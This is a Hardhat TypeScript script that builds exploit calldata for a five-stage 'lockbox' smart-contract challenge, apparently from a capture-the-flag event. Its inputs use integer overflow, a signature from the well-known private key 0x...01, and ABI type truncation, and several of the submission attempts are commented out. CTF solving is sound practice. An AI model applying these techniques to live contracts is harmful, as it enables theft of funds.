import { constants, Contract, utils, Wallet } from 'ethers'
import { AbiCoder, defaultAbiCoder, solidityKeccak256 } from 'ethers/lib/utils'
import { task } from 'hardhat/config'

task('lockbox')
  .addOptionalPositionalParam('setupAddress')
  .setAction(async ({ setupAddress }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer', signer.address)

    // setup problem

    let setup: Contract
    if (setupAddress) {
      setup = await ethers.getContractAt(
        'contracts/lockbox/Setup.sol:Setup',
        setupAddress,
      )
    } else {
      setup = await (
        await ethers.getContractFactory('contracts/lockbox/Setup.sol:Setup')
      ).deploy()
    }
    console.log('Setup')
    console.log('  at', setup.address)

    // init contracts

    const entrypoint = await ethers.getContractAt(
      'Entrypoint',
      await setup.entrypoint(),
    )
    console.log('Entrypoint')
    console.log('  at', entrypoint.address)

    const stage1 = await ethers.getContractAt(
      'Stage1',
      await setup.entrypoint(),
    )
    const stage2 = await ethers.getContractAt(
      'Stage2',
      await setup.entrypoint(),
    )
    const stage3 = await ethers.getContractAt(
      'Stage3',
      await setup.entrypoint(),
    )
    const stage4 = await ethers.getContractAt(
      'Stage4',
      await setup.entrypoint(),
    )
    const stage5 = await ethers.getContractAt(
      'Stage5',
      await setup.entrypoint(),
    )

    // perform exploit
    const zero = entrypoint.interface.encodeFunctionData('solve(bytes4)', [
      (await signer.provider?.getBlock('latest'))?.hash?.slice(0, 10),
    ])

    const sig = utils.splitSignature(
      await new Wallet(
        '0000000000000000000000000000000000000000000000000000000000000001',
      ).signMessage(solidityKeccak256(['string'], ['stage1'])),
    )
    const one = stage1.interface.encodeFunctionData(
      'solve(uint8,bytes32,bytes32)',
      [sig.v, sig.r, sig.s],
    )

    const two = stage2.interface.encodeFunctionData('solve(uint256,uint256)', [
      constants.MaxUint256,
      1,
    ])

    const three = stage3.interface.encodeFunctionData(
      'solve(uint256,uint256[4],uint256[4])',
      [0, [0, 2, 4, 6], [0, 2, 4, 6]],
    )

    const hash = solidityKeccak256(['string'], ['choose'])
    const four = stage4.interface.encodeFunctionData(
      'solve(uint32[6],uint256)',
      [[hash, hash, hash, hash, hash, hash], 0],
    )

    const five = stage5.interface.encodeFunctionData('solve()')

    // try sequence

    // await entrypoint.solve(guess?.slice(0, 10))
    // await stage1.solve(sig.v, sig.r, sig.s)

    // try concat

    // const data = first.concat(second.slice(2))

    // console.log('Data', data)

    // await signer.sendTransaction({
    //   to: entrypoint.address,
    //   data,
    // })

    // try batch

    // await (
    //   await ethers.getContractFactory('Execute')
    // ).deploy(entrypoint.address, [zero, one])

    // verify

    console.log('Success?', await setup.isSolved())
  })
